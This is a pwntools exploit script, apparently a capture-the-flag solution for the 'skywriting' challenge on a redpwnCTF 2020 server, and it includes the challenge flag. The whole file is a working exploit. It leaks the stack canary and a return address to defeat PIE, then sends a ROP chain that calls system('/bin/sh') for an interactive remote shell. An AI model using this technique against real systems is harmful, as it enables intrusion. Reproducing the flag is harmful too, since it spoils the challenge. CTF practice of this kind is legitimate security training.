#!/usr/bin/env python3


#flag{a_cLOud_iS_jUSt_sOmeBodY_eLSes_cOMpUteR}

from pwn import *
from time import sleep

exe = ELF("./skywriting")

context.binary = exe


def conn():
	return process([exe.path])


def main():
    #r = conn()
    r = remote("2020.redpwnc.tf", 31034)
    r.recvline()
    r.sendline(b"1")

    #STAGE1 : Leak Canary
    r.recvuntil("Is the answer intuitive yet? Give it your best shot: ")

    offset = 136
    leak_canary = b"M"*(offset+1 - 4)
    leak_canary += b"FLAG"
    r.send(leak_canary)
    r.recvuntil("FLA")
    canary = r.recv(8)

    canary = canary.decode("ISO-8859-1")
    canary = canary.replace("G", "\x00")
    
    canary = u64(canary)
    log.info("Canary is 0x%x", canary)
    print("Canary is ", hex(canary))


    ##STAGE2 : Leak Return Pointer (to know an address from the binary and defeat PIE)
    
    r.recvuntil("Try again, give it another shot: ")
    leak_ret_pointer  = b"M"*offset
    leak_ret_pointer += b"B"*8
    leak_ret_pointer += b"M"*8
    leak_ret_pointer += b"C"*(8*3 + 4)
    leak_ret_pointer += b"FLAG"


    r.send(leak_ret_pointer)
    r.recvuntil(b"FLAG")
    ret_pointer = r.recv(6).decode("ISO-8859-1")
    ret_pointer += "\x00"*2

    ret_pointer = u64(ret_pointer)
    log.info("Ret pointer 0x%x", ret_pointer)

    binary_base = ret_pointer - 0x995

    log.info("Binary base address 0x%x", binary_base)

    #Stage3
    #To return from the function we need to passe -> notflag{a_cloud_is_just_someone_elses_computer}\n
	    
    ret = binary_base + 0x000000000000078e

    PopRdi = 0x0000000000000bd3
    sh = binary_base + 0xdf1

    final_payload = b"\x00"*(offset)
    final_payload += p64(canary)
    final_payload += b"M"*8
    final_payload += p64(binary_base + PopRdi)
    final_payload += p64(sh)
    final_payload += p64(ret)
    final_payload += p64(binary_base + exe.plt["system"])

    r.recvuntil("Try again, give it another shot: ")
    r.sendline(final_payload)
    sleep(1)
    r.sendline("notflag{a_cloud_is_just_someone_elses_computer}")

    r.interactive()


if __name__ == "__main__":
    main()
